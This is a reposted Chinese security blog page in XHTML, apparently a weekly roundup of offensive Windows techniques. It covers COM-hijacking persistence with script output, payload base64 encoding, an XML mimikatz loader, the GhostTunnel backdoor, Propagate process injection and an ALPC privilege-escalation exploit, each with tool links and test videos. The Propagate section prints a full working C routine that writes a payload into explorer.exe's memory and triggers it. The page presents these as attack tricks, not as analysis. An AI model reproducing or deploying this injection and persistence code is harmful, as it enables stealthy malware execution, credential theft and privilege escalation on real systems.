@@ -1,0 +1,73 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>本周骚姿势记录及测试视频</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>本周骚姿势记录及测试视频</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzI5MTM4NzYwNw==&amp;mid=2247484557&amp;idx=1&amp;sn=34ab5764389381ed508dc2bce40feb42&amp;chksm=ec102535db67ac2311e26ccd625f13c5d01709c37602745de4be2b4fbf7ec3af9607e76c427a&amp;scene=126&amp;sessionid=1681663675#rd">http://mp.weixin.qq.com/s?__biz=MzI5MTM4NzYwNw==&amp;mid=2247484557&amp;idx=1&amp;sn=34ab5764389381ed508dc2bce40feb42&amp;chksm=ec102535db67ac2311e26ccd625f13c5d01709c37602745de4be2b4fbf7ec3af9607e76c427a&amp;scene=126&amp;sessionid=1681663675#rd</a></blockquote><p><strong style="font-size: 16px;">1. com 劫持</strong><br/></p><p>https://github.com/3gstudent/COM-Object-hijacking<br/></p><p><br/></p><pre class="EnlighterJSRAW" data-enlighter-language="null">PS C:\Users\demon&gt; powershell -ExecutionPolicy Bypass -File "C:\Users\demon\Desktop\COM Object hijacking persistence.ps1
+"
+[*] Searching Folder...
+[+] Create Folder:  C:\Users\demon\AppData\Roaming\Microsoft\Installer\
+[+] Create Folder:  C:\Users\demon\AppData\Roaming\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}
+[*] Detecting operating system...
+[+] OS: x64
+[*] Releasing file...
+[+] Done.
+[*] Modifying registry...
+[*] 64-bit:
+[*] 32-bit:
+[+] Done.
+PS C:\Users\demon&gt;</pre><p style="text-align: center;"><img class="size-full wp-image-7097 aligncenter" data-ratio="1.034871794871795" data-src="https://mmbiz.qpic.cn/mmbiz_png/ibeLmr4ptIHK5X8qnic220IRgAI1ribEJ6aKlT543gTvZtcxrOKJ5uib5CcoibYjzobFb6uXuLmHz2021yOS477dj3A/640?wx_fmt=png" data-type="png" data-w="975" height="1009" width="975" src="../Images/5b248da8d7c65a00dbf86d7afd6d50ee.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/ibeLmr4ptIHK5X8qnic220IRgAI1ribEJ6aKlT543gTvZtcxrOKJ5uib5CcoibYjzobFb6uXuLmHz2021yOS477dj3A/640?wx_fmt=png"/></p><p><br/></p><p><strong>测试视频：</strong></p><p>http://oc78wb8cz.bkt.clouddn.com/COM%E5%8A%AB%E6%8C%81.mp4<br/></p><p><br/></p><p>关于其中的Payload加密：</p><pre class="EnlighterJSRAW" data-enlighter-language="null">PS C:\Users\demon&gt; $fileContent = [System.IO.File]::ReadAllBytes('C:\Users\demon\Desktop\calcmutex.dll')
+PS C:\Users\demon&gt; $fileContentEncoded = [System.Convert]::ToBase64String($fileContent)| set-content ("123.txt")</pre><p>http://www.4hou.com/technology/4958.html</p><p>https://github.com/3gstudent/test/blob/master/calcmutex.dll</p><p><img class="size-full wp-image-7098 aligncenter" data-ratio="0.40348837209302324" data-src="https://mmbiz.qpic.cn/mmbiz_png/ibeLmr4ptIHK5X8qnic220IRgAI1ribEJ6aEvPHMPNjwoa44FXLxdx9mD7IpWuF8dN9WP41KvNN0oM39AhLGoArXA/640?wx_fmt=png" data-type="png" data-w="860" height="347" width="860" src="../Images/ff56ff7d38422144ba614bbedb435d9c.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/ibeLmr4ptIHK5X8qnic220IRgAI1ribEJ6aEvPHMPNjwoa44FXLxdx9mD7IpWuF8dN9WP41KvNN0oM39AhLGoArXA/640?wx_fmt=png"/></p><h2><strong><br/></strong></h2><h2><strong>2.xml_mimikatz</strong></h2><p>https://gist.github.com/caseysmithrc/b1190e023cd29c1910c01a164675a22e<br/></p><p><br/></p><p><img class="size-full wp-image-7099 aligncenter" data-ratio="0.8937300743889479" data-src="https://mmbiz.qpic.cn/mmbiz_jpg/ibeLmr4ptIHK5X8qnic220IRgAI1ribEJ6afibRkGbx7kappLUWZTEmQcUhdN54j2rfBicUJV6ywY6HOSpU0s1bJLoA/640?wx_fmt=jpeg" data-type="jpeg" data-w="941" height="841" width="941" src="../Images/006023803ce6553ac426f03499615878.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_jpg/ibeLmr4ptIHK5X8qnic220IRgAI1ribEJ6afibRkGbx7kappLUWZTEmQcUhdN54j2rfBicUJV6ywY6HOSpU0s1bJLoA/640?wx_fmt=jpeg"/></p><h2><strong><br/></strong></h2><h2><strong>3.Ghost_tunnel</strong></h2><p>https://github.com/360PegasusTeam/GhostTunnel<br/></p><p><strong><br/></strong></p><p><strong>测试视频：</strong></p><p>http://oc78wb8cz.bkt.clouddn.com/ghostunnel.mp4</p><h2><strong><br/></strong></h2><h2><strong>4.Propagate</strong></h2><p>https://github.com/odzhan/injection</p><p><br/></p><p><strong>测试视频：</strong></p><p>https://modexp.wordpress.com/2018/08/23/process-injection-propagate/</p><p><br/></p><p>它适用于Windows 7和10，但不执行错误检查，因此可能导致explorer.exe崩溃或其他一些意外行为。</p><p><br/></p><p><img class="size-full wp-image-7101 aligncenter" data-ratio="0.6552094522019334" data-src="https://mmbiz.qpic.cn/mmbiz_jpg/ibeLmr4ptIHK5X8qnic220IRgAI1ribEJ6aeNfe3PTTeyvG35pILNtEx9XCR62N5KCicFwZmrHpDYoXqyrTkmD8EFw/640?wx_fmt=jpeg" data-type="jpeg" data-w="931" height="610" width="931" src="../Images/e78b1cab6bc0edc4004e736e96e7740d.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_jpg/ibeLmr4ptIHK5X8qnic220IRgAI1ribEJ6aeNfe3PTTeyvG35pILNtEx9XCR62N5KCicFwZmrHpDYoXqyrTkmD8EFw/640?wx_fmt=jpeg"/></p><pre class="EnlighterJSRAW" data-enlighter-language="null">VOID propagate(LPVOID payload, DWORD payloadSize) {
+    HANDLE          hp, p;
+    DWORD           id;
+    HWND            pwh, cwh;
+    SUBCLASS_HEADER sh;
+    LPVOID          psh, pfnSubclass;
+    SIZE_T          rd,wr;
+    // 1.获取父窗口句柄 
+    pwh = FindWindow(L"Progman", NULL);
+    //2.获取子窗口句柄 
+    cwh = FindWindowEx(pwh, NULL, L"SHELLDLL_DefView", NULL);
+    // 3.获取子类标题的句柄 
+    p = GetProp(cwh, L"UxSubclassInfo");
+    // 4.获取explorer.exe的进程ID 
+    GetWindowThreadProcessId(cwh, &amp;id);
+    // 打开explorer.exe 
+    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
+    //6.读取当前子类标题
+    ReadProcessMemory(hp, (LPVOID)p, &amp;sh, sizeof(sh), &amp;rd);
+    // 7.为新的子类标题分配RW内存 
+    psh = VirtualAllocEx(hp, NULL, sizeof(sh),
+        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    //8.为有效负载分配RWX内存
+    pfnSubclass = VirtualAllocEx(hp, NULL, payloadSize,
+        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    // 9. 将payload写入内存
+    WriteProcessMemory(hp, pfnSubclass,
+        payload, payloadSize, &amp;wr);
+    // 10.将pfnSubclass字段设置为有效负载地址，并将
+    // 写回到处理内存 
+    sh.CallArray[0].pfnSubclass = (SUBCLASSPROC)pfnSubclass;
+    WriteProcessMemory(hp, psh, &amp;sh, sizeof(sh), &amp;wr);
+
+    // 11.使用SetProp 
+    SetProp(cwh, L"UxSubclassInfo", psh);
+    // 12.触发经由窗口消息payload
+    PostMessage(cwh, WM_CLOSE, 0, 0);
+    // 13.恢复原始子类标题
+    SetProp(cwh, L"UxSubclassInfo", p);
+    // 14.可用内存和关闭句柄
+    VirtualFreeEx(hp, psh, 0, MEM_DECOMMIT | MEM_RELEASE);
+    VirtualFreeEx(hp, pfnSubclass, 0, MEM_DECOMMIT | MEM_RELEASE);
+
+    CloseHandle(hp);
+}</pre><h2 class="post-title"><strong><br/></strong></h2><h2 class="post-title"><strong>4.ALPC_EXP</strong></h2><p>https://hunter2.gitbook.io/darthsidious/privilege-escalation/alpc-bug-0day</p><p><br/></p><p><strong>测试视频：</strong></p><p>http://oc78wb8cz.bkt.clouddn.com/ALPC_0DAY_EXP.mp4</p>
+        
+</body>
+</html>
